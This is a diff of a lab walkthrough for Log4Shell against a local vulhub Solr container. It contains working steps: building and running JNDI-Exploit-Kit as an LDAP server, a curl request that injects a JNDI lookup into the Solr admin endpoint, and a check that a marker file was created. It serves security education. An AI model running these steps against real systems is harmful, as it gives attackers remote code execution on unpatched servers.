@@ -126,36 +126,62 @@ curl -g -s "http://$TARGET:8983/solr/admin/cores?action=\${jndi:ldap://$ATTACKER
 
 #### Escalating to RCE
 
-Create and compile the payload using:
+Create and compile the payload using the JNDI Lookup kit.
 
 ```bash
 cd ~/log4shell-lab
-cat > Exploit.java <<'EOF'
-/* Minimal Log4Shell proof-of-concept class for a controlled lab only. */
-public class Exploit
-{
-    static
-    {
-        try
-        {
-            /* Benign proof of execution: drop a marker file. */
-            Runtime.getRuntime().exec(new String[] { "touch", "/tmp/pwned" });
-        }
-        catch (Exception e)
-        {
-            e.printStackTrace();
-        }
-    }
-}
-EOF
-javac Exploit.java                      # -> Exploit.class
+git clone https://github.com/pimps/JNDI-Exploit-Kit.git
+export MAVEN_OPTS="-Djdk.util.zip.disableZip64ExtraFieldValidation=true"
+cd JNDI-Exploit-Kit && mvn clean package -DskipTests && cd ~/log4shell-lab
+ls JNDI-Exploit-Kit/target/*-all.jar       # confirm the exact jar name
+#   -> target/JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar
 ```
 
-Then, build the LDAP server:
+---
+
+**Terminal 2:**
 
 ```bash
-cd ~/log4shell-lab
-git clone https://github.com/mbechler/marshalsec.git
-cd marshalsec && mvn clean package -DskipTests && cd ~/log4shell-lab
-#   -> marshalsec/target/marshalsec-0.0.3-SNAPSHOT-all.jar
+newgrp docker            
+docker ps                
+ATTACKER=$(docker network inspect cve-2021-44228_default -f '{{(index .IPAM.Config 0).Gateway}}')
+echo "$ATTACKER"         # must print 172.18.0.1 or IP
+cd ~/log4shell-lab/JNDI-Exploit-Kit
+java -jar target/JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar -C "touch /tmp/pwned" -L "$ATTACKER:1389"
+# expect: [LDAP_ADDR] >> 172.18.0.1
 ```
+
+---
+
+**Terminal 1:***
+
+Use the LDAP link for KITPATH under “JDK 1.8 whose trustURLCodebase is true”, in my case:
+
+```
+Target environment(Build in JDK 1.8 whose trustURLCodebase is true):
+rmi://172.18.0.1:1099/uj9v6c
+ldap://172.18.0.1:1389/uj9v6c
+```
+
+Run the following:
+
+```bash
+curl -g -s "http://$TARGET:8983/solr/admin/cores?action=\${jndi:ldap://$ATTACKER:1389/<KIT-PATH>}"
+```
+
+(In my case)
+
+```bash
+curl -g -s "http://$TARGET:8983/solr/admin/cores?action=\${jndi:ldap://$ATTACKER:1389/uj9v6c}"
+```
+
+Then use the following to verify RCE:
+
+```bash
+cd ~/log4shell-lab/vulhub/log4j/CVE-2021-44228
+docker compose exec solr ls -l /tmp/pwned
+#   -> -rw-r--r-- ... /tmp/pwned
+```
+
+![alt text](Images/RCEConfirmed.png)
+*Figure: Successful RCE confirmed on the left, with the LDAP server on the right confirming JNDI Lookup.*
